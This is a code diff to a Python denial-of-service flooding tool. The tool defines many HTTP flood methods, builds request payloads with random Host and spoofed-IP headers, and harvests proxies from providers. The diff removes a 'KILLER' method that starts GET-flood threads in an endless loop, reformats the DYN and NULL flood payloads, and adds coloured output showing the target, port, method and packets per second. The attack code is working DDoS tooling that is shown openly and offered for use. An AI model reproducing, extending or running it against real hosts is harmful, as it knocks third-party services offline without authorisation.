@@ -78,7 +78,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -117,6 +117,18 @@ class Counter:
 
 REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
+
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
 
 class Tools:
@@ -689,10 +701,6 @@ class HttpFlood(Thread):
                 Tools.send(s, self._defaultpayload)
         Tools.safe_close(s)
 
-    def KILLER(self) -> None:
-        while True:
-            Thread(target=self.GET, daemon=True).start()
-
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
@@ -810,9 +818,9 @@ class HttpFlood(Thread):
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
-                                          "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
-                                          self.randHeadercontent +
-                                          "\r\n")
+                                  "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+                                  self.randHeadercontent +
+                                  "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -879,10 +887,10 @@ class HttpFlood(Thread):
 
     def NULL(self) -> None:
         payload: Any = str.encode(self._payload +
-                                          "Host: %s\r\n" % self._target.authority +
-                                          "User-Agent: null\r\n" +
-                                          "Referrer: null\r\n" +
-                                          self.SpoofIP + "\r\n")
+                                  "Host: %s\r\n" % self._target.authority +
+                                  "User-Agent: null\r\n" +
+                                  "Referrer: null\r\n" +
+                                  self.SpoofIP + "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -972,7 +980,6 @@ class HttpFlood(Thread):
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
-        if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
 class ProxyManager:
@@ -983,7 +990,7 @@ class ProxyManager:
             provider for provider in cf["proxy-providers"]
             if provider["type"] == Proxy_type or Proxy_type == 0
         ]
-        logger.info("Downloading Proxies from %d Providers" % len(providrs))
+        logger.info("Downloading Proxies form %d Providers" % len(providrs))
         proxes: Set[Proxy] = set()
 
         with ThreadPoolExecutor(len(providrs)) as executor:
@@ -1001,7 +1008,7 @@ class ProxyManager:
     @staticmethod
     def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
         logger.debug(
-            "Downloading Proxies from (URL: %s, Type: %s, Timeout: %d)" %
+            "Downloading Proxies form (URL: %s, Type: %s, Timeout: %d)" %
             (provider["url"], proxy_type.name, provider["timeout"]))
         proxes: Set[Proxy] = set()
         with suppress(TimeoutError, exceptions.ConnectionError,
@@ -1110,9 +1117,9 @@ class ToolsConsole:
 
                         with get(domain, timeout=20) as r:
                             logger.info(('status_code: %d\n'
-                                      'status: %s') %
-                                      (r.status_code, "ONLINE"
-                                      if r.status_code <= 500 else "OFFLINE"))
+                                         'status: %s') %
+                                        (r.status_code, "ONLINE"
+                                        if r.status_code <= 500 else "OFFLINE"))
 
             if cmd == "INFO":
                 while True:
@@ -1456,14 +1463,17 @@ if __name__ == '__main__':
                 event.set()
                 ts = time()
                 while time() < ts + timer:
-                    logger.debug('PPS: %s, BPS: %s / %d%%' %
-                                 (Tools.humanformat(int(REQUESTS_SENT)),
-                                  Tools.humanbytes(int(BYTES_SEND)),
-                                  round((time() - ts) / timer * 100, 2)))
+                    logger.debug(
+                        f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%' %
+                        (target or url.human_repr(),
+                         port,
+                         method,
+                         Tools.humanformat(int(REQUESTS_SENT)),
+                         Tools.humanbytes(int(BYTES_SEND)),
+                         round((time() - ts) / timer * 100, 2)))
                     REQUESTS_SENT.set(0)
                     BYTES_SEND.set(0)
                     sleep(1)
-
                 event.clear()
                 exit()
 
